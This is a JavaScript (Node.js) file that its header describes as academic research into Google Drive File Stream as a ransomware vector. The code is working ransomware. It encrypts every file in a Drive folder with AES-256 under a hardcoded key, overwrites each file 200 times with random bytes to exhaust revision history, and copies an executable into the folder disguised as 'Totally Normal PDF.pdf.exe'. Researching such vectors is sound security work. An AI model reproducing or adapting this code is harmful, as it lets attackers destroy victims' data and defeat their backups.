/*  *  Written By Andrew Giggey - Amplified IT - andrewgiggey@amplifiedit.com *
    * Sample code trying to encrpyt any file in a folder, in this case the folder that is used by drive file stream *
    * This code is purely academic in intent, and was used to research the fesability of using Drive File Stream as an attack vector for ransomware *
    * This code uses a simple AES-256 symmetric encryption scheme
*/
const crypto = require('crypto');
const fs = require('fs');

const algorithm = 'aes-256-cbc';
const password = 'SuperPassword2';
const key = crypto.scryptSync(password, 'salt', 32);
const iv = Buffer.alloc(16,0);


const Encrypt = (data) => {
  const cipher = crypto.createCipheriv(algorithm,key,iv);
  return cipher.update(data);
}
// I've included this code, which if we stored the key, we can later decrpyt a file
// If you try this for your self, please be sure to store your encryption key and initialization vector to disk
const Decrypt = (data) => {
  const decipher = crypto.createDecipheriv(algorithm,key,iv);
  return decipher.update(data);
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

  console.log('Starting gRansom. Looking for the presence of Google Drive File Stream');
  // Look to see if a G:/ drive exists, if so does it have a folder called MyDrive? If so we are assuming that is File Stream
  if(fs.readdirSync('G:/My Drive')) {
    console.log('My Drive folder found.')
    // For this demo, im looking at a folder in my drive called, "Ransomware Here Please" -- always worth asking nicely right?
    // Lets Encrypt any file in this folder.

    let targetFolderPath = 'G:/My Drive/Ransomware Here Please/';
    var files = fs.readdirSync(targetFolderPath);
    // List how many files it found.
    console.log(files.length + ' files found!')

    for(let i = 0; i < files.length; i++) {
      console.log('Reading file: ' + files[i]);
      try {
        // for testing at one point I added a .enc extension to identify which files we actually encrpyted. I removed this so I can later try writting nonsense to the revision history
      let encrpytedFile = Encrypt(fs.readFileSync(targetFolderPath + files[i]));

      // Try to delete the old one
      // This method is really a best case if this would happen, as the deleted files would end up in your drive trash, which means you could self restore.
      //fs.unlinkSync(targetFolderPath + files[i]);

      // Google claims to only hold on to revision history for the last 100 revisions or anything that happend in the last 30 days. Lets try writting nonsense 200 times and seeing if that fools it
      for(let j = 0; j < 200; j++) {
        console.log('Writing Nonesense!!: ' + j);
        fs.writeFileSync(targetFolderPath + files[i], crypto.randomBytes(1337));
        const timeout = async () => {
          await sleep(2000);
        }
      }
      fs.writeFileSync(targetFolderPath + files[i], encrpytedFile);

      


      }
      catch (err) {
        // Any Google file (i.e anything ending in .gdoc in this example, returns an error that we are unable to write to a directory, so it seems the file it self is hidden behind some google magic, the base file system doesn't have access to it.
        console.log(err);
      }
    }
    console.log('All Files encrypted!')

    // Try to inject our ransomware into a file to mask it.

    const newFile = 'Totally Normal PDF.pdf';

    const readBinary = fs.createReadStream('index-win.exe');
    const writeBinary = fs.createWriteStream(targetFolderPath + newFile + '.exe');

    // Stream the data to our new binary
    readBinary.pipe(writeBinary);
  }